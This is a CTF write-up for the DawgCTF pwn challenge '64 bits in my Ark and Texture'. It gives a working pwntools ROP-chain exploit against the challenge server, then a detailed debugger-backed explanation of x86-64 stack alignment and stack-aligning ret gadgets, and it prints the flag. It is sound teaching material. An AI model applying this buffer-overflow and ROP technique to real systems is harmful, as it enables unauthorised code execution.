https://ctftime.org/event/2651

# 64 bits in my Ark and Texture (pwn)

Can you pwn it? No libc or system needed. Just good ol, 64 bit binary exploitation.

nc connect.umbccd.net 22237

## Analysis

`main` @ `0x4015df`:

- Asks a set of questions about the ABI (details omitted from this writeup)
- Calls `fgets((char *)&local_98, 0x200, stdin)`

`win1` @ `0x401401`:

- Reads the first part of the flag from `flag1.txt` and writes it to `stdout`
- Calls `fgets((char *)&local_28, 0x60, stdin)`

`win2` @ `0x401314`:

- Checks that `EDI` - or the function's first argument - is equal to `0xdeadbeef`
- Reads the second part of the flag from `DEADBEEF.txt` and writes it to `stdout`
    - Note that the `%X` format specifier is used to we get the resulting filename having upper case letters
- Calls `fgets((char*)&local_38, 0x100, stdin)`

`win3` @ `0x4011e6`:

- Checks that `EDI` - or the function's first argument - is equal to `0xdeadbeef`
- Checks that `ESI` - or the function's second argument - is equal to `0xdeafface`
- Checks that `EDX` - or the function's third argument - is equal to `0xfeedcafe`
- Reads the third part of the flag from `DEADBEEFDEAFFACEFEEDCAFE.txt` and writes it to `stdout`
    - Note that the `%X` format specifier is used to we get the resulting filename having upper case letters

## Solution

1) Supply answers to the initial basic questions namely `2`, `1` and `4`
2) Use the call to `fgets` in `main` to write our entire rop chain to the stack
3) Supply some token input to the calls to `fgets` in `win1` and `win2` leaving our original rop chain on the stack
    - Note that it would be possible to solve this using 3 distinct rop chains but that is not what I chose to do

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chall", checksec=False)
context.binary = elf
context.terminal = ["ghostty", "-e"]

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("connect.umbccd.net", 22237)

p.sendline(b"2")
p.sendline(b"1")
p.sendline(b"4")

p.readuntil(b"jump to the function")
p.readline()

rop = ROP(elf)
rop.raw(b"A" * 0x98)
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("win1")
rop.rdi = 0xdeadbeef
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("win2")
rop.rdi = 0xdeadbeef
rop.rsi = 0xdeafface
rop.rdx = 0xfeedcafe
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("win3")
rop.call("exit")
p.sendline(rop.chain())

p.readuntil(b"claim your advance.")
flag = p.readline()[:-1]

p.sendlineafter(b"Continue:", b"A")
p.readuntil(b"I believe in you\n")
flag += p.readline()[:-1]

p.sendlineafter(b"Final Test:", b"A")
p.readuntil(b"reward\n\n")
flag += p.readline()[:-1]

print(flag.decode()) # DawgCTF{C0ngR4tul4t10ns_d15c1p13_y0u_4r3_r34dy_2_pwn!}
```

### Identifying and Addressing Stack Alignment Issues

I saw a lot of people struggling with this on Discord so hopefully this is helpful for some of those people.

Firstly note that the alignment of the stack can vary when the remote is using a different libc.so or ld.so and I suspect that's where most people's issue start i.e. locally the stack has a different alignment than remotely.

For example I can reproduce a stack alignment issue locally by commenting out the 3rd stack aligning ret as follows:

```python
rop.rdx = 0xfeedcafe
#rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("win3")
rop.call("exit")
p.sendline(rop.chain())
```

Don't forget to change the script to launch with gdb too:

```python
#p = elf.process()
p = elf.debug(gdbscript="")
#p = remote("connect.umbccd.net", 22237)
```

Now I can see the following crash locally:

```bash
pwndbg> c
Continuing.
Reading /usr/lib/libc.so.6 from remote target...

Program received signal SIGSEGV, Segmentation fault.
0x000078a3a92cafee in __printf_buffer_init_end (buf=0x7ffc6b0326f8, base=<optimized out>,
    end=0xffffffffffffffff <error: Cannot access memory at address 0xffffffffffffffff>,
    mode=__printf_buffer_mode_sprintf) at ../include/printf_buffer.h:124
124       buf->write_base = base;
```

Note that you may need not need to remove any of the 3 stack aligning rets to get a crash - as you may crash already - or you may need to remove 2 - play around with it until you get a crash.

We can see that in this example we have crashed inside of `__vsprintf_internal` and `pwndbg` helpfully annotated the line with `<[0x7ffc6b0326f8] not aligned to 16 bytes>`:

```bash
► 0x78a3a92cafee <__vsprintf_internal+174>    movaps xmmword ptr [rbp - 0x40], xmm0     <[0x7ffc6b0326f8] not aligned to 16 bytes>
```

Note that `movaps` stands for something like "move an aligned packed single precision floating point value" and that it requires that the location in memory you are moving from is aligned to a 16 byte boundary.

Note also that this is just a representative example of what can go wrong when the stack is misaligned it is not the only error you may run into.

We can see that the value `0x7ffc6b0326f8` is present in 3 registers namely `RBX`, `RDI` and `RSP`:

```bash
pwndbg> regs
*RAX  0xffffffffffffffff
*RBX  0x7ffc6b0326f8 ◂— 1
 RCX  0
*RDX  0x7ffc6b032748 ◂— 0x3000000010
*RDI  0x7ffc6b0326f8 ◂— 1
*RSI  0x40207a ◂— 0x2573257325005825 /* '%X' */
 R8   0
 R9   0
 R10  0
*R11  0x202
*R12  1
 R13  0
*R14  0x78a3a94ab000 (_rtld_global) —▸ 0x78a3a94ac310 ◂— 0
 R15  0
*RBP  0x7ffc6b032738 —▸ 0x7ffc6b032818 —▸ 0x7ffc6b032888 ◂— 0x4141414141414141 ('AAAAAAAA')
*RSP  0x7ffc6b0326f8 ◂— 1
*RIP  0x78a3a92cafee (__vsprintf_internal+174) ◂— movaps xmmword ptr [rbp - 0x40], xmm0
```

We can see that the value of `RBP` which is `0x7ffc6b032738` is closely related to the value of `RSP` which is still `0x7ffc6b0326f8`.

Now recall back to the line upon which the debugger halted:

```bash
movaps xmmword ptr [rbp - 0x40], xmm0
```

We are loading from memory at an address relative to `RBP`. Because `RBP`'s value is derived from the value of `RSP` and because `RSP`'s value is not aligned to a 16 byte boundary we know that `0x40` less than `RBP` is also not going to be aligned and this instruction will issue a general protection exception and that's why we've stopped.

#### So what's going on here exactly? Why is the stack not aligned any more?

Let's first take a quick look at the backtrace to see exactly where we are:

```bash
 ► 0   0x78a3a92cafee __vsprintf_internal+174
   1   0x78a3a92cafee __vsprintf_internal+174
   2   0x78a3a92a8147 sprintf+167
   3         0x401253 win3+109
   4         0x4010f0 exit@plt
   5              0xa None
   6              0x0 None
```

The issue is that by returning to `win3`, via our rop chain, rather than calling it via a `call` instruction we have offset the value of `RSP` by 8 bytes.

Think about what would happens in the normal code where we call functions rather than return to them via a rop chain.

When libc transfers control to `main` the stack will be aligned to an 8 byte boundary:

```bash
pwndbg> regs
*RAX  0x4015df (main) ◂— endbr64
*RBX  0x7ffc9547d3c8 —▸ 0x7ffc9547f60a ◂— '/home/user/ctf/dawg/pwn/64_bits_in_my_ark_and_texture/chall'
*RCX  0x7df0a1270680 (__exit_funcs) —▸ 0x7df0a1272000 (initial) ◂— 0
*RDX  0x7ffc9547d3d8 —▸ 0x7ffc9547f646 ◂— 'SHELL=/bin/bash'
*RDI  1
*RSI  0x7ffc9547d3c8 —▸ 0x7ffc9547f60a ◂— '/home/user/ctf/dawg/pwn/64_bits_in_my_ark_and_texture/chall'
*R8   0x401860 (__libc_csu_fini) ◂— endbr64
*R9   0x7df0a12b8e60 (_dl_fini) ◂— endbr64
*R10  0x7ffc9547cfd0 ◂— 0x1000000
*R11  0x203
*R12  1
 R13  0
*R14  0x7df0a12eb000 (_rtld_global) —▸ 0x7df0a12ec310 ◂— 0
 R15  0
*RBP  0x7ffc9547d340 —▸ 0x7ffc9547d3a0 ◂— 0
*RSP  0x7ffc9547d2a8 —▸ 0x7df0a10af488 (__libc_start_call_main+120) ◂— mov edi, eax
*RIP  0x4015df (main) ◂— endbr64
pwndbg> nearpc
 ► 0x4015df <main>       endbr64
   0x4015e3 <main+4>     push   rbp
   0x4015e4 <main+5>     mov    rbp, rsp
   0x4015e7 <main+8>     sub    rsp, 0x90
   0x4015ee <main+15>    mov    rax, qword ptr [rip + 0x2aab]     RAX, [stdout@@GLIBC_2.2.5]
   0x4015f5 <main+22>    mov    ecx, 0                            ECX => 0
   0x4015fa <main+27>    mov    edx, 2                            EDX => 2
   0x4015ff <main+32>    mov    esi, 0                            ESI => 0
   0x401604 <main+37>    mov    rdi, rax
   0x401607 <main+40>    call   setvbuf@plt                 <setvbuf@plt>

   0x40160c <main+45>    mov    rax, qword ptr [rip + 0x2aad]     RAX, [stderr@@GLIBC_2.2.5]
```

One of the first things that we do in `main` is to establish the stack frame by pushing `rbp` onto the stack this will align the stack to a 16 byte boundary:

```bash
pwndbg> regs
 RAX  0x4015df (main) ◂— endbr64
 RBX  0x7ffc9547d3c8 —▸ 0x7ffc9547f60a ◂— '/home/user/ctf/dawg/pwn/64_bits_in_my_ark_and_texture/chall'
 RCX  0x7df0a1270680 (__exit_funcs) —▸ 0x7df0a1272000 (initial) ◂— 0
 RDX  0x7ffc9547d3d8 —▸ 0x7ffc9547f646 ◂— 'SHELL=/bin/bash'
 RDI  1
 RSI  0x7ffc9547d3c8 —▸ 0x7ffc9547f60a ◂— '/home/user/ctf/dawg/pwn/64_bits_in_my_ark_and_texture/chall'
 R8   0x401860 (__libc_csu_fini) ◂— endbr64
 R9   0x7df0a12b8e60 (_dl_fini) ◂— endbr64
 R10  0x7ffc9547cfd0 ◂— 0x1000000
 R11  0x203
 R12  1
 R13  0
 R14  0x7df0a12eb000 (_rtld_global) —▸ 0x7df0a12ec310 ◂— 0
 R15  0
 RBP  0x7ffc9547d340 —▸ 0x7ffc9547d3a0 ◂— 0
*RSP  0x7ffc9547d2a0 —▸ 0x7ffc9547d340 —▸ 0x7ffc9547d3a0 ◂— 0
*RIP  0x4015e4 (main+5) ◂— mov rbp, rsp
pwndbg> nearpc $pc-1
   0x4015df <main>       endbr64
 ► 0x4015e3 <main+4>     push   rbp
   0x4015e4 <main+5>     mov    rbp, rsp                          RBP => 0x7ffc9547d2a0 —▸ 0x7ffc9547d340 —▸ 0x7ffc9547d3a0 ◂— ...
   0x4015e7 <main+8>     sub    rsp, 0x90
   0x4015ee <main+15>    mov    rax, qword ptr [rip + 0x2aab]     RAX, [stdout@@GLIBC_2.2.5]
   0x4015f5 <main+22>    mov    ecx, 0                            ECX => 0
   0x4015fa <main+27>    mov    edx, 2                            EDX => 2
   0x4015ff <main+32>    mov    esi, 0                            ESI => 0
   0x401604 <main+37>    mov    rdi, rax
   0x401607 <main+40>    call   setvbuf@plt                 <setvbuf@plt>

   0x40160c <main+45>    mov    rax, qword ptr [rip + 0x2aad]     RAX, [stderr@@GLIBC_2.2.5]
```

Next we can see that we create space on the stack for locals with `sub rsp, 0x90` and this will preserve the 16 byte alignment of the stack.

Now when we go to `call` another function, such as `win1`, we will push the address to return to, that is the address of the instruction after the `call` instruction, onto the stack and this will align the stack down to an 8 byte boundary again. If this isn't clear remember that `call` is sort of like `push return-address; jmp func;` fused together.

Let's contrast with returning to `win1`. The `ret` instruction that starts our rop chain off will add 8 bytes to the stack pointer after reading the value of `win1` from the stack and then rip to `win1`. At first this is not a problem as in the `call` example we've offset the stack pointer by pushing a return address onto the stack and in the `ret` example we've also offset the stack pointer by 8 bytes by popping a return address from the stack albeit by offseting the stack pointer in different directions. But what happens we don't just return to `win1` but also to `win2`?

Let's compare and constrast the operations on the stack pointer and the stack pointer's alignment throughout:

rsp = 0x7ffc9547d2b0, rbp = 0x7ffc9547d340
1) call win1; rsp = 0x7ffc9547d2a8, rbp = 0x7ffc9547d340
1) push rbp; rsp = 0x7ffc9547d2a0, rbp = 0x7ffc9547d340
1) mov rbp, rsp; rsp = 0x7ffc9547d2a0, rbp = 0x7ffc9547d2a0
1) ...
1) leave; rsp = 0x7ffc9547d2a8, rbp = 0x7ffc9547d2a0
1) ret; rsp = 0x7ffc9547d2b0, rbp = 0x7ffc9547d2a0
1) call win2 ; rsp = 0x7ffc9547d2a8, rbp = 0x7ffc9547d340
1) push rbp; rsp = 0x7ffc9547d2a0, rbp = 0x7ffc9547d340
1) mov rbp, rsp; rsp = 0x7ffc9547d2a0, rbp = 0x7ffc9547d2a0
1) ... all good stack is aligned to 16 bytes
1) movaps xmmword ptr [rbp - 0x40], xmm0

rsp = 0x7ffc9547d2b0, rbp = 0x7ffc9547d340
1) ret2win1; rsp = 0x7ffc9547d2b8, rbp = 0x7ffc9547d340
1) push rbp; rsp = 0x7ffc9547d2b0, rbp = 0x7ffc9547d340
1) mov rbp, rsp; rsp = 0x7ffc9547d2b0, rbp = 0x7ffc9547d2b0
1) ...
1) leave; rsp = 0x7ffc9547d2b8, rbp = 0x7ffc9547d340
1) ret2win2; rsp = 0x7ffc9547d2c0, rbp = 0x7ffc9547d340
1) push rbp; rsp = 0x7ffc9547d2c8, rbp = 0x7ffc9547d340
1) mov rbp, rsp; rsp = 0x7ffc9547d2c8, rbp = 0x7ffc9547d2c8
1) ... danger stack not aligned to 16 bytes
1) movaps xmmword ptr [rbp - 0x40], xmm0 => #GP

Now we've changed the alignment of the stack pointer by the time we reach `win2`.

#### How can we identify issues like this?

The first thing is to be aware of the potential impact of your exploit on the alignment of the stack pointer. Do you call functions that use instructions that require their arguments be 16 byte aligned and derive those arguments from the value of the stack pointer? If the code you return to calls something in libc chances are good that you do!

The next thing is to check with a debugger. If you get a crash like the one I've shown above here you know that at the very least your exploit is not going to work locally due to stack alignment issues. Now ideally you would use something like `pwninit` along with a copy of the exact versions of libc.so and ld.so that the remote is using in order to get the same stack alignment as the remote but sometimes that is not possible as is the case in this task.

The last thing to consider is that if your exploit works locally but not remotely that you may need to manually align the stack at one of more of the points in your rop chain.

#### How do we manually align the stack?

The easiest way to do this is to simply return to a `ret` instruction. This works because as a gadget this acts as a `nop` but it will increment the value of the stack pointer by 8. If our stack was previously not aligned to a 16 byte boundary now it will be.

Consider our rop chain with the stack aligning `ret`s commented out:

```python
rop = ROP(elf)
rop.raw(b"A" * 0x98)
#rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("win1")
rop.rdi = 0xdeadbeef
#rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("win2")
rop.rdi = 0xdeadbeef
rop.rsi = 0xdeafface
rop.rdx = 0xfeedcafe
#rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("win3")
rop.call("exit")
p.sendline(rop.chain())
```

We can see that if we if we simply suspect that there are stack alignment issues there are only 3 logical places to insert stack aligning rets. This means that even in the absolute worst case there are only 3 bits worth or 7 possible permutations ( remember that we are assuming that no stack aligning rets crashes on the remote ).

What do I mean by a logical place? If you remember earlier we saw an example of a crash on `movaps` and I mentioned that a lot of functions inside of libc.so assume that the stack is aligned to 16 bytes. This means that we can say that just before a call to a function that makes further calls to libc.so is a logical place to consider manually aligning the stack.

So in the worst case where your exploit works locally and you don't have libc.so or ld.so simply try adding and removing stack aligning rets at most logical points in your rop chain until it "just works" or your have tried all of the permutations.

Another way to approach this problem is to change where you jump in a function. Consider that by jumping to the very start of a function you will go through the function's prologue and this will setup the stack frame and decrement the stack pointer by 8. You can simply jump later in the function after this has happened and the stack pointer will now by aligned differently. This is generally a little more tricky to get right but also possible.

## Flag
`DawgCTF{C0ngR4tul4t10ns_d15c1p13_y0u_4r3_r34dy_2_pwn!}`

smiley 2025/04/19
